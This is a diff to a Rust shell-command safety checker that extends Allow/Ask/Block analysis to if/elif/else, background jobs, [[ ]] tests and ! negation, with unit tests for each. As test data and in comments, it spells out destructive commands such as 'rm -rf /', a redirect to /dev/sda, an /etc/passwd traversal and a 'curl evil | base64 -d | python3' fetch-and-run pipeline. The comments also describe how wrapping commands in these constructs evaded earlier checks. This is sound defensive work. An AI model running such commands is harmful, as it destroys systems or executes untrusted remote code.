@@ -311,8 +311,8 @@
 use std::collections::HashMap;
 
 use crate::ast::{
-    Assignment, AssignmentValue, Command, CommandLine, CompoundCommand, FileRedirectionKind,
-    FunctionDefinition, Pipeline, Redirection, SimpleCommand, Word, WordPiece,
+    Assignment, AssignmentValue, Command, CommandLine, CompoundCommand, ElifClause, ExtendedTest,
+    FileRedirectionKind, FunctionDefinition, Pipeline, Redirection, SimpleCommand, Word, WordPiece,
 };
 use crate::normalize::{self, NormalizedWord, Resolution, UnresolvableKind};
 use crate::parser;
@@ -420,7 +420,7 @@ fn analyze_at_depth(
     }
 }
 
-/// Folds every pipeline of a [`CommandLine`] (joined by `;`/`&&`/`||`,
+/// Folds every pipeline of a [`CommandLine`] (joined by `;`/`&&`/`||`/`&`,
 /// treated identically per plan.md §6 item 7) into one worst-decision-wins
 /// [`Verdict`]. A single [`Env`] threads variable assignments across the
 /// whole line (rule 2's "any earlier simple command" resolution) — reset
@@ -430,10 +430,17 @@ fn analyze_at_depth(
 ///
 /// `cwd` (issue #103) threads the folded working-directory context forward
 /// across every pipeline on the line, uniformly regardless of separator
-/// (`;`/`&&`/`||` all mutate it forward the same way — a deliberate
-/// over-approximation for `||`, which a real shell only runs on the
-/// left side's failure; harmless given the additive, worst-wins nature of
-/// everything this context feeds, see `CwdContext`'s own docs).
+/// (`;`/`&&`/`||`/`&` all mutate it forward the same way — a deliberate
+/// over-approximation for `||` (a real shell only runs the right side on
+/// the left side's failure) and, since issue #191, `&` too (`cd /tmp &`
+/// actually backgrounds `cd` into its own subshell in real bash, so the
+/// mutation never really persists to the foreground shell at all); harmless
+/// given the additive, worst-wins nature of everything this context feeds,
+/// see `CwdContext`'s own docs). For DANGER-folding (the actual `Verdict`,
+/// as opposed to `cwd`), backgrounding needs no special-casing at all: the
+/// backgrounded pipeline still runs, just asynchronously, so it is folded
+/// in exactly like every other separator (`crate::ast::Separator::Async`'s
+/// own docs).
 fn evaluate_command_line(
     command_line: &CommandLine,
     rules: &Rules,
@@ -486,12 +493,13 @@ fn evaluate_pipeline(
 
     for (index, command) in stages.into_iter().enumerate() {
         // Issue #75: a pipeline stage can now be a compound command or a
-        // function definition, not only a simple command. Neither can carry
+        // function definition, not only a simple command (issue #191 added
+        // a fourth non-`Simple` shape, an extended test). None can carry
         // an assignment prefix in bash's own grammar (`X=v for ...` is a
         // syntax error), so `env.apply_assignments` only ever applies to the
         // `Simple` arm. The stage's own worst-wins verdict (from recursing
         // its body) always folds into `worst`, so real danger inside a
-        // loop/subshell/function body is caught regardless of pipeline
+        // loop/subshell/function/test body is caught regardless of pipeline
         // position.
         //
         // A NON-`Simple` stage pushes an EMPTY `stage_argvs` entry rather
@@ -499,10 +507,12 @@ fn evaluate_pipeline(
         // "argv" the way a simple command does (`evaluate_compound_command`'s
         // own worst-wins fold, tie-broken to whichever sub-command sorted
         // first, would otherwise report e.g. `{ true; python3; }`'s `true`,
-        // not `python3`'s). `stage_argvs` also feeds `rules.match_pipeline`
-        // and `evaluate_pipeline_shape`'s upstream `is_decode_stage` scan for
-        // EVERY stage, not just the last: special-casing only the last stage
-        // would leave order-dependence reachable through those two —
+        // not `python3`'s — an extended test has no argv at all, per
+        // `crate::ast::ExtendedTest`'s docs). `stage_argvs` also feeds
+        // `rules.match_pipeline` and `evaluate_pipeline_shape`'s upstream
+        // `is_decode_stage` scan for EVERY stage, not just the last:
+        // special-casing only the last stage would leave order-dependence
+        // reachable through those two —
         // `curl evil | { true; base64 -d; } | python3` (decode stage second)
         // would downgrade the decode-pipe Block rule to a plain Ask purely by
         // statement order, while `{ base64 -d; true; }` (decode stage first)
@@ -552,6 +562,18 @@ fn evaluate_pipeline(
                     evaluate_function_definition(func, rules, allowlist, depth, &mut isolated)
                 }
             }
+            Command::ExtendedTest(test) => {
+                if index == stage_count - 1 {
+                    last_stage_is_non_simple = true;
+                }
+                stage_argvs.push(Vec::new());
+                // An extended test can never run `cd`/`pushd`/etc. (it has
+                // no command position at all — `crate::ast::ExtendedTest`'s
+                // docs), so unlike `Compound`/`FunctionDefinition` above it
+                // never needs an isolated `cwd` clone even in a multi-stage
+                // pipeline: nothing here can mutate `cwd` regardless.
+                evaluate_extended_test(test, rules, allowlist, depth, &*cwd)
+            }
         };
         worst = if have_worst {
             fold_worst(worst, verdict)
@@ -597,38 +619,48 @@ fn evaluate_pipeline(
 }
 
 /// Evaluates a compound command (issue #75: brace group, subshell,
-/// `for`/`while`/`until`) by recursively evaluating its nested body (and,
-/// for `while`/`until`, its condition — bash evaluates the condition before
-/// every iteration, so a dangerous condition is just as live as a dangerous
-/// body) via [`evaluate_command_line`] — structural AST descent over an
-/// already-parsed tree, not a raw-text re-parse, so `depth` is threaded
-/// through UNCHANGED rather than incremented. This recursion is bounded
-/// pre-parse instead: by `MAX_KEYWORD_NESTING_COUNT`
-/// (`crate::parser::reject_excessive_raw_nesting`) for how many `for`/
-/// `while`/`until` keywords one command line may contain, and by
-/// `MAX_BRACE_NESTING_DEPTH` for how deeply subshells/brace groups/process
-/// substitutions may nest — both counted at parse time, before this
-/// function ever runs, so this recursion cannot itself be driven
-/// unboundedly deep the way a raw-text substitution re-parse could be.
+/// `for`/`while`/`until`; issue #191: `if`/`elif`/`else`) by recursively
+/// evaluating its nested body (and, for `while`/`until`/`if`, its
+/// condition(s) — bash evaluates a `while`/`until` condition before every
+/// iteration, and an `if`/`elif` condition to pick a branch, so a dangerous
+/// condition is just as live as a dangerous body) via
+/// [`evaluate_command_line`] — structural AST descent over an already-parsed
+/// tree, not a raw-text re-parse, so `depth` is threaded through UNCHANGED
+/// rather than incremented. This recursion is bounded pre-parse instead: by
+/// `MAX_KEYWORD_NESTING_COUNT` (`crate::parser::reject_excessive_raw_nesting`)
+/// for how many `for`/`while`/`until`/`if` keywords one command line may
+/// contain, and by `MAX_BRACE_NESTING_DEPTH` for how deeply subshells/brace
+/// groups/process substitutions may nest — both counted at parse time,
+/// before this function ever runs, so this recursion cannot itself be
+/// driven unboundedly deep the way a raw-text substitution re-parse could
+/// be.
 ///
 /// Also runs the compound's own attached redirections through the same
-/// checks a [`SimpleCommand`]'s redirections get (`check_redirect_targets`,
-/// `scan_redirection_expansions`), and, for a `ForClause`, its `in ...`
-/// word list through the same expansion-position scan an assignment's RHS
-/// gets (`scan_word_expansions`) — bash expands that list once, before the
-/// loop's first iteration, exactly like an assignment's RHS.
+/// checks a [`SimpleCommand`]'s redirections get, and, for a `ForClause`,
+/// its `in ...` word list through the same expansion-position scan an
+/// assignment's RHS gets — bash expands that list once, before the loop's
+/// first iteration, exactly like an assignment's RHS. Both are handled by
+/// [`apply_attached_word_and_redirect_checks`], shared with
+/// [`evaluate_extended_test`] (issue #191) so the two never independently
+/// drift on how these security-critical checks are applied.
 ///
 /// `cwd` (issue #103) is threaded through per-variant, not uniformly, since
 /// this is the one place `BraceGroup` and `Subshell` diverge
 /// (`crate::ast::CompoundCommand`'s own docs): a `BraceGroup`'s body is
 /// recursed with `cwd` itself (a `cd` inside persists into the caller's own
 /// scope), a `Subshell`'s with a throwaway clone (isolated, matching real
-/// subshell semantics). `ForClause`/`WhileClause`/`UntilClause` also
-/// recurse their body/condition with a throwaway clone (loop iteration
-/// count is unknowable statically, so no particular final state can be
-/// inherited), but separately poison the CALLER's own `cwd` when
+/// subshell semantics). `ForClause`/`WhileClause`/`UntilClause`/`IfClause`
+/// also recurse their body/condition(s) with a throwaway clone (which
+/// branch(es) actually ran, or how many loop iterations, is unknowable
+/// statically, so no particular final state can be inherited), but
+/// separately poison the CALLER's own `cwd` when
 /// [`command_line_may_change_cwd`] finds any cwd-changing command anywhere
-/// reachable inside — see that function's docs for exactly what counts.
+/// reachable inside ANY branch — see that function's docs for exactly what
+/// counts. `IfClause` evaluates every branch (condition, `then`, every
+/// `elif`, `else`) and folds them all worst-wins: only one branch actually
+/// runs, but which one is unknowable statically, so the same
+/// evaluate-every-branch-and-fold stance already used for a loop's
+/// condition-plus-body pair applies here too, over more branches.
 fn evaluate_compound_command(
     compound: &CompoundCommand,
     rules: &Rules,
@@ -637,57 +669,136 @@ fn evaluate_compound_command(
     cwd: &mut CwdContext,
 ) -> Verdict {
     let redirect_anchor = cwd.clone();
-    let (worst, redirections, for_words): (Verdict, &[Redirection], Option<&[Word]>) =
-        match compound {
-            CompoundCommand::BraceGroup { body, redirections } => {
-                let verdict = evaluate_command_line(body, rules, allowlist, depth, cwd);
-                (verdict, redirections.as_slice(), None)
+    let (worst, redirections, extra_words): (Verdict, &[Redirection], &[Word]) = match compound {
+        CompoundCommand::BraceGroup { body, redirections } => {
+            let verdict = evaluate_command_line(body, rules, allowlist, depth, cwd);
+            (verdict, redirections.as_slice(), [].as_slice())
+        }
+        CompoundCommand::Subshell { body, redirections } => {
+            let mut isolated = cwd.clone();
+            let verdict = evaluate_command_line(body, rules, allowlist, depth, &mut isolated);
+            (verdict, redirections.as_slice(), [].as_slice())
+        }
+        CompoundCommand::ForClause {
+            words,
+            body,
+            redirections,
+            ..
+        } => {
+            let mut isolated = cwd.clone();
+            let verdict = evaluate_command_line(body, rules, allowlist, depth, &mut isolated);
+            if command_line_may_change_cwd(body) {
+                *cwd = CwdContext::Poisoned;
             }
-            CompoundCommand::Subshell { body, redirections } => {
-                let mut isolated = cwd.clone();
-                let verdict = evaluate_command_line(body, rules, allowlist, depth, &mut isolated);
-                (verdict, redirections.as_slice(), None)
+            (
+                verdict,
+                redirections.as_slice(),
+                words.as_deref().unwrap_or_default(),
+            )
+        }
+        CompoundCommand::WhileClause {
+            condition,
+            body,
+            redirections,
+        }
+        | CompoundCommand::UntilClause {
+            condition,
+            body,
+            redirections,
+        } => {
+            let mut isolated = cwd.clone();
+            let cond_verdict =
+                evaluate_command_line(condition, rules, allowlist, depth, &mut isolated);
+            let body_verdict = evaluate_command_line(body, rules, allowlist, depth, &mut isolated);
+            if command_line_may_change_cwd(condition) || command_line_may_change_cwd(body) {
+                *cwd = CwdContext::Poisoned;
             }
-            CompoundCommand::ForClause {
-                words,
-                body,
-                redirections,
-                ..
-            } => {
-                let mut isolated = cwd.clone();
-                let verdict = evaluate_command_line(body, rules, allowlist, depth, &mut isolated);
-                if command_line_may_change_cwd(body) {
-                    *cwd = CwdContext::Poisoned;
-                }
-                (verdict, redirections.as_slice(), words.as_deref())
+            (
+                fold_worst(cond_verdict, body_verdict),
+                redirections.as_slice(),
+                [].as_slice(),
+            )
+        }
+        CompoundCommand::IfClause {
+            condition,
+            then_body,
+            elifs,
+            else_body,
+            redirections,
+        } => {
+            let mut isolated = cwd.clone();
+            let mut worst =
+                evaluate_command_line(condition, rules, allowlist, depth, &mut isolated);
+            worst = fold_worst(
+                worst,
+                evaluate_command_line(then_body, rules, allowlist, depth, &mut isolated),
+            );
+            let mut may_change_cwd =
+                command_line_may_change_cwd(condition) || command_line_may_change_cwd(then_body);
+            for ElifClause { condition, body } in elifs {
+                worst = fold_worst(
+                    worst,
+                    evaluate_command_line(condition, rules, allowlist, depth, &mut isolated),
+                );
+                worst = fold_worst(
+                    worst,
+                    evaluate_command_line(body, rules, allowlist, depth, &mut isolated),
+                );
+                may_change_cwd = may_change_cwd
+                    || command_line_may_change_cwd(condition)
+                    || command_line_may_change_cwd(body);
             }
-            CompoundCommand::WhileClause {
-                condition,
-                body,
-                redirections,
+            if let Some(else_body) = else_body {
+                worst = fold_worst(
+                    worst,
+                    evaluate_command_line(else_body, rules, allowlist, depth, &mut isolated),
+                );
+                may_change_cwd = may_change_cwd || command_line_may_change_cwd(else_body);
             }
-            | CompoundCommand::UntilClause {
-                condition,
-                body,
-                redirections,
-            } => {
-                let mut isolated = cwd.clone();
-                let cond_verdict =
-                    evaluate_command_line(condition, rules, allowlist, depth, &mut isolated);
-                let body_verdict =
-                    evaluate_command_line(body, rules, allowlist, depth, &mut isolated);
-                if command_line_may_change_cwd(condition) || command_line_may_change_cwd(body) {
-                    *cwd = CwdContext::Poisoned;
-                }
-                (
-                    fold_worst(cond_verdict, body_verdict),
-                    redirections.as_slice(),
-                    None,
-                )
+            if may_change_cwd {
+                *cwd = CwdContext::Poisoned;
             }
-        };
-    let mut worst = worst;
+            (worst, redirections.as_slice(), [].as_slice())
+        }
+    };
 
+    apply_attached_word_and_redirect_checks(
+        worst,
+        extra_words,
+        "a `for` clause's `in` word list",
+        redirections,
+        depth,
+        rules,
+        allowlist,
+        &redirect_anchor,
+    )
+}
+
+/// Shared tail of [`evaluate_compound_command`] and [`evaluate_extended_test`]
+/// (issue #191): scans `extra_words` (a `for` clause's `in` list, or an
+/// extended test's operands) and `redirections` for embedded command/process
+/// substitutions (`scan_word_expansions`/`scan_redirection_expansions`),
+/// then runs `redirections` through the same target/ascent-descent checks a
+/// [`SimpleCommand`]'s redirections get (`check_redirect_targets`, the
+/// issue #103 composed-cwd pass, and the issue #78 ascent-descent floor),
+/// folding every result into `worst`. Factored out so these
+/// security-critical checks are written once, not duplicated (and
+/// potentially drift) across every caller with attached redirections.
+///
+/// `extra_words_description` names `extra_words`'s position in a raised
+/// reason (e.g. `"a `for` clause's `in` word list"`), matching
+/// `scan_word_expansions`'s own `position_description` parameter.
+#[allow(clippy::too_many_arguments)]
+fn apply_attached_word_and_redirect_checks(
+    mut worst: Verdict,
+    extra_words: &[Word],
+    extra_words_description: &str,
+    redirections: &[Redirection],
+    depth: usize,
+    rules: &Rules,
+    allowlist: &Allowlist,
+    redirect_anchor: &CwdContext,
+) -> Verdict {
     // `scan_word_expansions`/`scan_redirection_expansions` both write a
     // `has_any` presence flag (`scan_expansion_positions`'s callers use it
     // to decide rule-3 allow-downgrade eligibility) — this caller has no
@@ -699,15 +810,15 @@ fn evaluate_compound_command(
         has_any: &mut _has_any,
         floor: &mut floor,
     };
-    for word in for_words.into_iter().flatten() {
+    for word in extra_words {
         scan_word_expansions(
             word,
             depth,
             rules,
             allowlist,
-            &redirect_anchor,
+            redirect_anchor,
             &mut accum,
-            "a `for` clause's `in` word list",
+            extra_words_description,
         );
     }
     scan_redirection_expansions(
@@ -715,7 +826,7 @@ fn evaluate_compound_command(
         depth,
         rules,
         allowlist,
-        &redirect_anchor,
+        redirect_anchor,
         &mut accum,
     );
     if let Some((floor_decision, floor_reason)) = floor {
@@ -743,19 +854,19 @@ fn evaluate_compound_command(
         worst = fold_worst(worst, verdict);
     }
 
-    // Issue #103: the compound's own attached redirect targets, composed
-    // against the cwd context as it stood BEFORE this compound's body ran
-    // (`redirect_anchor` — a redirect target is resolved once, at
-    // invocation time, not affected by a `cd` the body itself performs).
-    if let CwdContext::Known(anchor) = &redirect_anchor
+    // Issue #103: the attached redirect targets, composed against the cwd
+    // context as it stood BEFORE this construct's body ran (`redirect_anchor`
+    // — a redirect target is resolved once, at invocation time, not
+    // affected by a `cd` the body itself performs).
+    if let CwdContext::Known(anchor) = redirect_anchor
         && let Some(composed) = evaluate_composed_cwd_redirects(redirections, anchor, rules)
     {
         worst = fold_worst(worst, composed);
     }
 
-    // Issue #78: the same ascent-then-descent
-    // floor `evaluate_simple_command` applies to a command's own
-    // redirects, extended to a compound command's own attached redirects
+    // Issue #78: the same ascent-then-descent floor `evaluate_simple_command`
+    // applies to a command's own redirects, extended to a compound
+    // command's/extended test's own attached redirects
     // (`{ ...; } > ../../../../etc/passwd`) — a hard match above already
     // covers the certain case, this covers the plausible-but-unprovable
     // one, always capped at Ask.
@@ -773,6 +884,36 @@ fn evaluate_compound_command(
     }
 
     worst
+}
+
+/// Evaluates a `[[ ... ]]` extended test (issue #191) by scanning every
+/// operand word for embedded command/process substitutions and its own
+/// attached redirections for the same target/ascent-descent rules a
+/// compound command's redirections get — see [`crate::ast::ExtendedTest`]'s
+/// docs for why the operands are scanned as expansion positions rather than
+/// evaluated as an argv (bash performs no word-splitting/globbing on
+/// them, so they are never command words), and
+/// [`apply_attached_word_and_redirect_checks`] for the shared
+/// implementation. Defaults to `Allow` (an ordinary test with nothing
+/// dangerous inside it is inert) rather than recursing through
+/// [`evaluate_simple_command`] at all.
+fn evaluate_extended_test(
+    test: &ExtendedTest,
+    rules: &Rules,
+    allowlist: &Allowlist,
+    depth: usize,
+    cwd: &CwdContext,
+) -> Verdict {
+    apply_attached_word_and_redirect_checks(
+        Verdict::allow(Vec::new()),
+        &test.words,
+        "an extended test ([[ ]]) operand",
+        &test.redirections,
+        depth,
+        rules,
+        allowlist,
+        cwd,
+    )
 }
 
 /// Evaluates a function definition (issue #75) by evaluating its body
@@ -4167,6 +4308,13 @@ fn command_may_change_cwd(command: &Command) -> bool {
         // inside a loop body doesn't silently escape the loop's own
         // poisoning check.
         Command::FunctionDefinition(func) => compound_command_may_change_cwd(&func.body),
+        // An extended test has no command position at all (`crate::ast::ExtendedTest`'s
+        // docs) — nothing inside `[[ ... ]]` itself can run `cd`. A `cd`
+        // hidden inside an operand's `$(...)` runs in that substitution's
+        // own subshell, matching `Command::Simple`'s own argument-position
+        // substitutions, which this same function does not descend into
+        // either.
+        Command::ExtendedTest(_) => false,
     }
 }
 
@@ -4185,6 +4333,25 @@ fn compound_command_may_change_cwd(compound: &CompoundCommand) -> bool {
         | CompoundCommand::UntilClause {
             condition, body, ..
         } => command_line_may_change_cwd(condition) || command_line_may_change_cwd(body),
+        // Issue #191: every branch is checked, matching
+        // `evaluate_compound_command`'s own IfClause handling — only one
+        // branch actually runs, but which one is unknowable statically.
+        CompoundCommand::IfClause {
+            condition,
+            then_body,
+            elifs,
+            else_body,
+            ..
+        } => {
+            command_line_may_change_cwd(condition)
+                || command_line_may_change_cwd(then_body)
+                || elifs.iter().any(|ElifClause { condition, body }| {
+                    command_line_may_change_cwd(condition) || command_line_may_change_cwd(body)
+                })
+                || else_body
+                    .as_deref()
+                    .is_some_and(command_line_may_change_cwd)
+        }
     }
 }
 
@@ -5087,7 +5254,10 @@ mod tests {
 
     #[test]
     fn unsupported_construct_asks_not_panics() {
-        assert_decision("if true; then rm -rf /; fi", Decision::Ask);
+        // `if` is now modeled (issue #191) and correctly `Block`s here — see
+        // the "==== Issue #191" test section below. `case` remains
+        // unsupported (module docs), so it still exercises this fallback.
+        assert_decision("case x in x) rm -rf /;; esac", Decision::Ask);
     }
 
     #[test]
@@ -7114,6 +7284,141 @@ mod tests {
             command = format!("$({command})");
         }
         assert_decision(&command, Decision::Block);
+    }
+
+    // ==== Issue #191: security-critical decisions for newly-supported
+    // constructs (`if`/`elif`/`else`, `&` background jobs, `[[ ]]` extended
+    // test, `!` pipeline negation) — the exact bypasses the issue reported,
+    // and the issue's own real-world benign repro ====
+
+    #[test]
+    fn if_clause_wrapping_rm_rf_blocks() {
+        assert_decision("if true; then rm -rf /; fi", Decision::Block);
+    }
+
+    #[test]
+    fn if_clause_condition_position_blocks() {
+        // The condition runs unconditionally too — a dangerous condition is
+        // just as live as a dangerous `then` body.
+        assert_decision("if rm -rf /; then echo x; fi", Decision::Block);
+    }
+
+    #[test]
+    fn if_clause_else_branch_blocks() {
+        // Only one branch actually runs, but which one is unknowable
+        // statically — every branch is evaluated and folded worst-wins.
+        assert_decision("if true; then echo x; else rm -rf /; fi", Decision::Block);
+    }
+
+    #[test]
+    fn if_clause_elif_branch_blocks() {
+        assert_decision(
+            "if true; then echo x; elif true; then rm -rf /; fi",
+            Decision::Block,
+        );
+    }
+
+    #[test]
+    fn benign_if_clause_allows() {
+        // Must not over-block: an if/then with nothing dangerous in any
+        // branch stays Allow.
+        assert_decision("if true; then echo x; fi", Decision::Allow);
+    }
+
+    #[test]
+    fn background_job_wrapping_rm_rf_blocks() {
+        // The issue's own repro: `&` backgrounds the pipeline, but it still
+        // runs — must reach the real rule engine, not fall back to a
+        // blanket Ask.
+        assert_decision("rm -rf / &", Decision::Block);
+    }
+
+    #[test]
+    fn benign_background_job_allows() {
+        assert_decision("echo hi &", Decision::Allow);
+    }
+
+    #[test]
+    fn extended_test_gating_rm_rf_blocks() {
+        // The issue's own repro: `[[ ]]` itself is Allow (nothing dangerous
+        // in the test operands), but the `&&`-joined `rm -rf /` pipeline it
+        // gates is a separate pipeline on the same `CommandLine` and folds
+        // in worst-wins regardless of the test's own verdict.
+        assert_decision("[[ -d /tmp/x ]] && rm -rf /", Decision::Block);
+    }
+
+    #[test]
+    fn benign_extended_test_allows() {
+        assert_decision("[[ -d /tmp ]] && echo ok", Decision::Allow);
+    }
+
+    #[test]
+    fn extended_test_operand_hiding_a_substitution_blocks() {
+        // The operand is a test operand, never a command word (bash does no
+        // word-splitting/globbing inside `[[ ]]`) — but it can still hide a
+        // command substitution, which the expansion-position scan must
+        // still catch.
+        assert_decision("[[ -n $(rm -rf /) ]]", Decision::Block);
+    }
+
+    #[test]
+    fn extended_test_attached_redirect_to_a_device_blocks() {
+        // `[[ ... ]]` can carry its own attached redirections
+        // (`bast::Command::ExtendedTest`'s own `Option<RedirectList>`) —
+        // `apply_attached_word_and_redirect_checks` must run the same
+        // redirect-target rule check a compound command's redirections get.
+        assert_decision("[[ -f x ]] >&/dev/sda", Decision::Block);
+    }
+
+    #[test]
+    fn pipeline_negation_wrapping_rm_rf_blocks() {
+        assert_decision("! rm -rf /", Decision::Block);
+    }
+
+    #[test]
+    fn benign_pipeline_negation_allows() {
+        assert_decision("! false", Decision::Allow);
+    }
+
+    #[test]
+    fn if_clause_condition_nests_an_extended_test_and_still_blocks() {
+        // Composition of the two new constructs: an extended test inside an
+        // `if` clause's condition, exactly the shape the issue's own
+        // traffic sample has.
+        assert_decision("if [[ -d /tmp/x ]]; then rm -rf /; fi", Decision::Block);
+    }
+
+    #[test]
+    fn issue_191_real_world_benign_repro_allows() {
+        // The issue's own quoted real-world example: a benign `for` loop
+        // (issue #75) whose body uses `if`/`!` (issue #191) — before this
+        // fix, the `if` clause alone floored the whole line to Ask even
+        // though nothing in it is dangerous.
+        assert_decision(
+            r#"for i in $(seq 1 12); do
+  out=$(gh pr checks 19 2>&1)
+  echo "=== attempt $i ==="
+  echo "$out"
+  if ! echo "$out" | rg -q "pending|in_progress|IN_PROGRESS"; then
+    break
+  fi
+  sleep 15
+done"#,
+            Decision::Allow,
+        );
+    }
+
+    #[test]
+    fn case_clause_remains_unsupported_control() {
+        // Control: `case` was not measured in issue #191's traffic sample
+        // (unlike `if`) and stays exactly as unsupported as before.
+        let verdict = decide("case x in x) rm -rf /;; esac");
+        assert_eq!(verdict.decision(), Decision::Ask);
+        let reason = verdict.reason().map(Reason::as_str).unwrap_or_default();
+        assert!(
+            reason.contains("case clause"),
+            "expected the reason to name the still-unsupported construct, got: {reason:?}"
+        );
     }
 
     // ==== A pipeline's final stage
